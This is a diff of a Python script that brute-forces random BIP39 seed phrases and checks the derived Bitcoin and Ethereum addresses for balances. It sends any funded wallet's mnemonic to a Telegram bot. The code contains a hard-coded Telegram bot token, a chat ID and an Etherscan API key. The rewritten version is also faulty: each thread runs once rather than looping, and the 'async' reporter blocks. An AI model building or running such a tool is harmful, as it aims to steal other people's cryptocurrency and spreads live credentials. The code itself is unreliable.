@@ -1,106 +1,103 @@
+import asyncio
+import threading
 import requests
 import time
-import threading
 import random
-import string
-import asyncio
-import aiohttp
-from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins
-from eth_account import Account
-from bitcoinaddress import Wallet
+from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
+from bitcoinrpc.authproxy import AuthServiceProxy
 
-# Telegram Bot Config
+# Telegram bot credentials
 TELEGRAM_BOT_TOKEN = "6600045884:AAHCVIaUjbi9a0GbiQpcOEJcpxK-g0iqQsU"
-TELEGRAM_CHAT_ID = "737206288"
+CHAT_ID = "737206288"
 
-# API Keys for balance checks
-ETHERSCAN_API_KEY = "75722298119549be9f2e368591eb0a7b"
+# Bitcoin and Ethereum API endpoints
+BTC_BALANCE_API = "https://blockchain.info/q/addressbalance/{}"
+ETH_BALANCE_API = "https://api.etherscan.io/api?module=account&action=balance&address={}&tag=latest&apikey=75722298119549be9f2e368591eb0a7b"
 
-# Global count
+# Generation counter
 total_generations = 0
-found_wallets = 0
 lock = threading.Lock()
 
 def generate_wallet():
-    """Generate a BTC and ETH wallet from a 12-word mnemonic."""
-    global total_generations, found_wallets
-    while True:
-        try:
-            mnemonic = Bip39MnemonicGenerator().FromWordsNumber(12)
-            seed = Bip39SeedGenerator(mnemonic).Generate()
-            
-            # Bitcoin Address
-            bip44_mst_ctx = Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
-            bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0).Change(0).AddressIndex(0)
-            btc_address = bip44_acc_ctx.PublicKey().ToAddress()
-            
-            # Ethereum Address
-            acct = Account.from_mnemonic(mnemonic)
-            eth_address = acct.address
-            
-            # Check balances
-            btc_balance = check_btc_balance(btc_address)
-            eth_balance = check_eth_balance(eth_address)
-            
-            # Update generation count
-            with lock:
-                total_generations += 1
-                
-            # If balance found, send to Telegram
-            if btc_balance > 1e-9 or eth_balance > 1e-9:
-                with lock:
-                    found_wallets += 1
-                send_to_telegram(mnemonic, btc_address, btc_balance, eth_address, eth_balance)
-        
-        except Exception as e:
-            print(f"Error in wallet generation: {e}")
-        
-        time.sleep(0.1)  # Reduce CPU usage
+    global total_generations
+
+    try:
+        # Generate a 12-word mnemonic
+        mnemonic = Bip39MnemonicGenerator().FromWordsNumber(12)
+        seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
+
+        # Bitcoin Wallet
+        bip44_btc = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
+        btc_wallet = bip44_btc.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+        btc_address = btc_wallet.PublicKey().ToAddress()
+
+        # Ethereum Wallet
+        bip44_eth = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
+        eth_wallet = bip44_eth.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+        eth_address = eth_wallet.PublicKey().ToAddress()
+
+        # Check balances
+        btc_balance = check_btc_balance(btc_address)
+        eth_balance = check_eth_balance(eth_address)
+
+        # Only send results if balance is greater than 0.000000001
+        if btc_balance > 0.000000001 or eth_balance > 0.000000001:
+            send_to_telegram(mnemonic, btc_address, btc_balance, eth_address, eth_balance)
+
+        with lock:
+            total_generations += 1
+
+    except Exception as e:
+        print(f"Error in wallet generation: {e}")
 
 def check_btc_balance(address):
-    """Check Bitcoin balance using Blockchair API."""
-    url = f"https://api.blockchair.com/bitcoin/dashboards/address/{address}"
     try:
-        response = requests.get(url).json()
-        return response['data'][address]['address']['balance'] / 1e8
+        response = requests.get(BTC_BALANCE_API.format(address))
+        return int(response.text) / 100000000  # Convert Satoshis to BTC
     except:
         return 0
 
 def check_eth_balance(address):
-    """Check Ethereum balance using Etherscan API."""
-    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={ETHERSCAN_API_KEY}"
     try:
-        response = requests.get(url).json()
-        return int(response['result']) / 1e18
+        response = requests.get(ETH_BALANCE_API.format(address))
+        data = response.json()
+        return int(data["result"]) / 10**18  # Convert Wei to ETH
     except:
         return 0
 
 def send_to_telegram(mnemonic, btc_address, btc_balance, eth_address, eth_balance):
-    """Send wallet details to Telegram."""
-    message = (f"🔥 Found Wallet!\n\n"
-               f"Mnemonic: {mnemonic}\n"
-               f"BTC Address: {btc_address}\nBalance: {btc_balance} BTC\n\n"
-               f"ETH Address: {eth_address}\nBalance: {eth_balance} ETH")
-    requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-                  data={"chat_id": TELEGRAM_CHAT_ID, "text": message})
+    message = (
+        f"🔑 New Wallet Found!\n\n"
+        f"📝 Mnemonic: `{mnemonic}`\n"
+        f"💰 Bitcoin: {btc_balance} BTC\n"
+        f"📌 BTC Address: `{btc_address}`\n\n"
+        f"💰 Ethereum: {eth_balance} ETH\n"
+        f"📌 ETH Address: `{eth_address}`"
+    )
+    requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
+                 params={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
 
-def report_status():
-    """Report total generations every 5 minutes."""
+async def report_generations():
     while True:
-        message = f"🔹 Total Generations: {total_generations}\n🔹 Wallets Found: {found_wallets}"
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-                      data={"chat_id": TELEGRAM_CHAT_ID, "text": message})
-        time.sleep(300)
+        time.sleep(300)  # Wait 5 minutes
+        with lock:
+            current_count = total_generations
+        message = f"⚡ Total wallet generations in last 5 min: {current_count}\n🔄 Total generations: {total_generations}"
+        requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
+                     params={"chat_id": CHAT_ID, "text": message})
+        
+async def main():
+    num_threads = 10  # Adjust based on your VPS specs
+    threads = []
 
-def main():
-    """Start multi-threaded wallet generation."""
-    num_threads = 4  # Adjust based on CPU cores
-    threads = [threading.Thread(target=generate_wallet, daemon=True) for _ in range(num_threads)]
-    
-    for thread in threads:
+    for _ in range(num_threads):
+        thread = threading.Thread(target=generate_wallet)
+        thread.daemon = True
         thread.start()
-    
-    report_status()  # Start reporting
+        threads.append(thread)
+
+    # Start reporting task
+    await asyncio.gather(report_generations())
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
